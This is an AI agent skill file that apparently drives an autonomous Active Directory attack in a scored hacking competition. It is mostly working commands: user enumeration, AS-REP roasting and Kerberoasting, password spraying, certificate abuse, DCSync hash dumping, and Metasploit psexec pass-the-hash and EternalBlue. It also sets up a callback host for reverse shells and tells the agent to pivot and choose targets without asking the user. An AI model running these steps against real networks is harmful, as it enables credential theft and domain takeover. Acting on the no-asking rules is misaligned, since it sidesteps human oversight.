---
name: solve-ad
description: "AD autonomous attack (token-optimized): enum -> BH/Kerberos -> spray -> privesc -> DCSync. If no arguments are given, automatically selects the next domain/DC target from MCP and proceeds."
argument-hint: "[dc_ip] [domain] [user:pass]"
---

# solve-ad (Token-Optimized)

Target: `$ARGUMENTS` or the AD target auto-selected from MCP

Arguments:
- `arg1` = `dc_ip` (optional)
- `arg2` = `domain` (optional)
- `arg3` = `user:pass` (optional)

## Reference (brief)
- `/.idea/tool-list.md`
- `/.idea/aitu-final-msf.md`
- `/.idea/bloodhound-plan.md`
- `/.claude/skills/risk-autopilot/references/objective-lock.md`
- `/.claude/skills/risk-autopilot/references/risk-priority.md`

## Tool Path Index

```bash
ROOT="."  # repository root
VENV="$ROOT/.venv/bin"
BINS="$ROOT/tools/bins"
WORDLIST="$ROOT/tools/wordlists/rockyou.txt"
LOOT_BASE="$ROOT/loots"
STATE="$ROOT/scripts/util/objective_state.sh"

# Core AD
$VENV/NetExec
$VENV/GetNPUsers.py
$VENV/GetUserSPNs.py
$VENV/secretsdump.py
$VENV/certipy
$VENV/bloodhound-python
$VENV/dacledit.py
$VENV/rbcd.py

# Optional helpers
ldapsearch
rpcclient
neo4j

# MSF (non-interactive RPC client -- never run msfconsole directly!)
MSF="$VENV/python $ROOT/scripts/msf/msf_client.py"
# Prerequisite: bash $ROOT/scripts/msf/start_msfrpcd.sh
```

MSF usage rules (MUST):
- **Never run `msfconsole` directly** -- it is interactive and will hang the PTY
- Always invoke via RPC through `scripts/msf/msf_client.py`
- Start the RPC daemon: `bash scripts/msf/start_msfrpcd.sh` (once, then it stays resident)
- For simple reverse shell/OOB from competition servers where outbound internet access is available, prefer the external Linux machine `infra:callback-linux:public`: `ssh root@<CALLBACK_IP>`, callback IP `<CALLBACK_IP>`.
- The operational standard is to use only `<CALLBACK_IP>` as the callback host. Do not maintain a separate fallback callback host.
- The current callback baseline services are `8443/tcp` reverse `chisel` server and `8000/tcp` payload HTTP server on `ssh root@<CALLBACK_IP>`.
- Quick check before use: `ssh root@<CALLBACK_IP> 'ss -lntp | egrep \":8443|:8000\"'`
- The callback host working root is fixed at `/var/lib/pixel`. Place binaries, payloads, logs, and temporary artifacts under its subdirectories (`bin`, `payloads`, `logs`, `tmp`) rather than scattering them.
- For MSF handlers, use the IP of the machine where the handler is actually running as `LHOST`. To use `<CALLBACK_IP>` as `LHOST`, either run the listener/handler on the callback machine or set up forwarding first.
- Usage examples:
  ```bash
  $MSF search eternalblue
  $MSF exploit exploit/windows/smb/psexec RHOSTS=<ip> SMBUser=admin SMBPass=hash LHOST=<my_ip>
  $MSF auxiliary auxiliary/scanner/smb/smb_version RHOSTS=<cidr>
  $MSF sessions
  $MSF session-run 1 hashdump
  ```

BloodHound artifact default location:
- `loots/<dc_ip>/bloodhound/`

## MCP Preflight (MUST)
1. `start_session(title="AD: <dc_ip>")` (if no session exists)
2. `get_sitrep`
3. `claim_host(hostId, sessionId)`
4. `update_checklist(enumStatus="in-progress")`
5. `get_pivot_chain(target=<dc_segment>)` (when direct access is not possible)
6. `heartbeat(sessionId)`
7. First restore the active objective with `scripts/util/objective_state.sh get`, and verify that the current AD step is directly connected to that objective.

## Autonomous Target Selection (Default)

If `arg1` is empty, automatically determine using the following order.

1. `scripts/util/objective_state.sh get`
2. If the active objective is empty, do not pick an arbitrary domain; return to `risk-autopilot`.
3. `get_sitrep`
4. Build a candidate pool only from AD targets directly connected to the active objective.
   - `CORP` -> `ftech.local`, `corp`, CORP DC/servers/accounts
   - `DEV` -> `dev.ftech.local`, CI/deploy/repo linked hosts and accounts
   - `HACKCITY` -> `hackcity.local`, jump/bridge/operator accounts that open OT access
   - `backup server` -> backup-related Windows hosts and their admin accounts
   - `SCADA chain` -> domain credentials, jump hosts, historians, engineering stations needed for OT entry
5. Select only those that match the above objective candidate pool from hosts with `88/389/445` port combinations, domain notes, and credential notes.
6. If there are multiple candidates for the same objective, prioritize:
   - Hosts that already have valid credentials
   - Hosts not yet `claim_host`ed
   - Hosts with loot/notes related to the active objective
7. If the objective candidate is not directly reachable but valid domain credentials and an unreachable segment exist, consider `pivot` first without asking the user.
8. If there are no objective candidates at all, record with `scripts/util/objective_state.sh backlog "<domain-or-host>" "ad candidate exists but not same-chain"` and hand off to `solve-web` or `risk-autopilot` within the same objective.

## Risk Bias (AITU Final)
- The default flow is `CORP -> DEV -> HACKCITY`
- If repo/deploy/CI secrets are visible, `DEV` can be looked at first.
- `HACKCITY` is worth `15000` points, so if a direct path is visible, escalate immediately.
- After domain takeover, immediately check for:
  - `backup server`
  - `jump host`
  - `historian`
  - `scada/hmi/operator/engineering` related hosts and accounts

## Objective Gate
- Continue if the active objective is `CORP`, `DEV`, `HACKCITY`, `backup server`, or a domain stage for SCADA entry.
- If the current domain does not directly advance the active objective, only record `scripts/util/objective_state.sh backlog "<domain-or-host>" "not same-chain"` and do not switch.
- Even if a direct path to a higher-scoring Risk exists, only switch when the `objective-lock` switch conditions are met.

## Credential Semantics (MUST)
- Only plaintext uses `secretType="password"`
- AS-REP/Kerberoast/other hash material: `secretType="hash"`
- NTLM: `secretType="ntlm"`, tickets: `secretType="ticket"`
- Hash material must not use `test_credential_access(..., status="valid")` before cracking
- `test_credential_access` records only actually attempted `host+protocol(+port)`
- Determine the domain name from MCP host/domain/credential context even if the user does not specify it.
- The `hackcity.local` segment defaults to `low-noise`, `cred-first`.

## AD Checklist (content + tools)

- [01 DC identification/basic info] Tool: `NetExec smb`, `ldapsearch`
```bash
$VENV/NetExec smb <dc_ip>
ldapsearch -x -H ldap://<dc_ip> -s base namingContexts
```
MCP: `update_host`, `log_event(scan)`

- [02 NULL/Guest check] Tool: `ldapsearch`, `NetExec smb`
```bash
ldapsearch -x -H ldap://<dc_ip> -b "DC=<domain>,DC=<tld>" "(objectClass=user)" sAMAccountName
$VENV/NetExec smb <dc_ip> -u '' -p '' --shares
$VENV/NetExec smb <dc_ip> -u guest -p '' --shares
```
MCP: `add_note`

- [03 Authenticated enumeration] Tool: `NetExec ldap/smb`
```bash
$VENV/NetExec ldap <dc_ip> -u '<user>' -p '<pass>' --users
$VENV/NetExec ldap <dc_ip> -u '<user>' -p '<pass>' --groups
$VENV/NetExec smb  <dc_ip> -u '<user>' -p '<pass>' --shares
$VENV/NetExec smb  <dc_ip> -u '<user>' -p '<pass>' --pass-pol
```
MCP: `add_loot`, `add_note`

- [04 SMB share collection] Tool: `smbclient.py`/`smbclient`
```bash
$VENV/smbclient.py '<domain>/<user>:<pass>@<dc_ip>'
```
MCP: `add_loot(lootType=smb-file|config|credential-file)`

- [05 BloodHound collection] Tool: `bloodhound-python`, `neo4j (optional)`
```bash
mkdir -p $LOOT_BASE/<dc_ip>/bloodhound
$VENV/bloodhound-python -d <domain> -u '<user>' -p '<pass>' -dc <dc_ip> -ns <dc_ip> -c All
mv *_users.json *_groups.json *_computers.json *_domains.json *_gpos.json *_ous.json *_containers.json \
  $LOOT_BASE/<dc_ip>/bloodhound/ 2>/dev/null || true
```
MCP: `add_loot`, `log_session_entry(action)`

- [06 AS-REP Roasting] Tool: `GetNPUsers.py`
```bash
$VENV/GetNPUsers.py <domain>/ -usersfile /tmp/ad_userlist.txt -no-pass -dc-ip <dc_ip> -format hashcat -outputfile /tmp/asrep_hashes.txt
```
MCP: `add_credential(secretType=hash)`, `add_loot`, `request_task(type=crack)`

- [07 Kerberoasting] Tool: `GetUserSPNs.py`
```bash
$VENV/GetUserSPNs.py <domain>/<user>:<pass> -dc-ip <dc_ip> -request -outputfile /tmp/kerberoast_hashes.txt
```
MCP: `add_credential(secretType=hash)`, `add_loot`, `request_task(type=crack)`

- [08 Crack result reflection] Tool: `hashcat/john (request_task)`
  - Hashcat worker must only use the external infrastructure `infra:hashcat-gpu:aws-apne2` (`ssh aitufinal-hashcat-gpu`, IP `<HASHCAT_IP>`).
  - The `ubuntu` account/pem for the hashcat server is not a competition credential and must not be registered as an MCP credential.
  - After cracking, register only the actual plaintext with `add_credential(secretType=password, source="hashcat-gpu:<hash_source>")`, and clearly note the host/service where the original hash came from in notes/source.
MCP: When plaintext is obtained, `add_credential(secretType=password)`

- [09 Spray/access verification] Tool: `NetExec smb/winrm/rdp/mssql`
```bash
$VENV/NetExec smb   <targets> -u '<user>' -p '<pass>' --continue-on-success
$VENV/NetExec winrm <targets> -u '<user>' -p '<pass>' --continue-on-success
$VENV/NetExec rdp   <targets> -u '<user>' -p '<pass>' --continue-on-success
$VENV/NetExec mssql <targets> -u '<user>' -p '<pass>' --continue-on-success
```
MCP: `test_credential_access` (actual attempts only)

- [10 AD CS audit] Tool: `certipy`
```bash
$VENV/certipy find -u '<user>@<domain>' -p '<pass>' -dc-ip <dc_ip> -vulnerable -stdout
```
MCP: `log_event(exploit)` + register new credentials

- [11 ACL/Delegation audit] Tool: `dacledit.py`, `rbcd.py`, `findDelegation.py`
```bash
$VENV/findDelegation.py <domain>/<user>:<pass> -dc-ip <dc_ip>
```
MCP: `add_note(tags=ad,acl,delegation)`

- [12 DCSync] Tool: `secretsdump.py`
```bash
$VENV/secretsdump.py <domain>/<user>:<pass>@<dc_ip> -just-dc-ntlm -outputfile /tmp/dcsync_hashes
```
MCP: `add_loot`, `add_credential(secretType=ntlm)`, `log_event(exploit)`

- [13 (Optional) MSF exploit/post] Tool: `msf_client.py` (RPC)
```bash
# SMB PsExec (Pass-the-Hash)
$MSF exploit exploit/windows/smb/psexec RHOSTS=<ip> SMBUser=<user> SMBPass=<ntlm> LHOST=<attacker>

# EternalBlue
$MSF exploit exploit/windows/smb/ms17_010_eternalblue RHOSTS=<ip> LHOST=<attacker>

# Session hashdump
$MSF session-run <id> hashdump

# Local exploit suggester
$MSF session-run <id> "run post/multi/recon/local_exploit_suggester"
```
MCP: `add_credential`, `log_event(exploit)`

## Delegation / Human Task Rule
The following should immediately use `request_task`:
- `nmap -p-`, long-running `hashcat/john` cracking
- Interactive PTY privilege escalation
- Tasks taking more than 10 minutes

## Completion
1. `update_checklist(enumStatus="done", exploitStatus="done", privescStatus="done")`
2. `log_session_entry(type="result", content="AD run complete")`
3. `heartbeat(sessionId)`
4. Next action via `get_sitrep`

## Stop / Handoff Rule
- If none of roast/ACL/AD CS/credential reuse produce a signal within 15 minutes, record the reason for being stuck with `add_note` and move to the next domain candidate or `solve-web`/`pivot` lane `within the same objective`.
- Do not ask the user "Should we look at CORP or DEV?"
